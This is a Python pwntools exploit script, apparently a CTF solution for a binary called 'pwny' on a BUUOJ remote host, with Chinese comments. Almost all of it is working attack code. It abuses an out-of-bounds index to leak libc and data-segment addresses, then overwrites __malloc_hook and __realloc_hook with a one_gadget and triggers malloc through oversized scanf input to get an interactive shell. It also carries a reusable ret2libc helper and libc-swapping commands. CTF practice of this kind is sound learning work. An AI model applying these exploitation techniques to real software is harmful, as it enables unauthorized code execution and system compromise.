from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './pwny'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def write(index):
    sla(b'Your choice: ',b'2')
    sla(b'Index:',int2bytes(index))

def write_con(index,content):
	sla(b'Your choice: ', b'2')
	sla(b'Index:', int2bytes(index))
	s(content)

def read(index):
    sla(b'Your choice: ',b'1')
	# 注意这里不能用int2bytes，因为此时用read读入且没有atol转入数字，而需要用p64直接写入十六进制
    # 卡了好久才发现
    sa(b'Index: ',index)


def convert(s):
	if s > 0:
		return s
	else:
		return 0xffffffffffffffff + s + 1

#两次write的改fd，第一次fd改成一个比较大的数，第二次就会导致读取失败
#所以temp的值不会变，利用的是这种巧妙的手法，来让fd等于0
write(0x100)
write(0x100)

#leak libc --泄露stderr
index = convert((0x202040 - 0x202060)//8)
read(p64(index))
ru(b'Result: ')
libc_base = int(bytes2int(ru(b'\n',drop=True)),16) - libc.sym["_IO_2_1_stderr_"]
log.success('libc_base: ' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadgets = [0x45226,0x4527a,0xf03a4,0xf1247]
one_gadget = libc_base + one_gadgets[1]
#经测试，ubantu自带libc直接用malloc_hook+one_gadget[2]或[3],若使用[1]则需要选用realloc+6或realloc+8

#leak bss --泄露data段偏移
index = convert((0x202008 - 0x202060)//8)
read(p64(index))
ru(b'Result: ')
content_addr = int(bytes2int(ru(b'\n',drop=True)),16) - 0x202008 + 0x202060
log.success('content_addr: ' + hex(content_addr))

#overwrite malloc_hook to one_gadget
# index = convert((malloc_hook - content_addr)//8)
# write_con(index,p64(one_gadget))

#overwrite realloc_hook to one_gadget
#overwrite malloc_hook to realloc + 0x9
index = convert((malloc_hook - content_addr)//8)
write_con(index,p64(realloc + 6))
write_con(index-1,p64(one_gadget))

# end
#知识点：scanf函数在遇到过长输入时会申请堆
sla(b'Your choice: ',b'1'*0x400)
itr()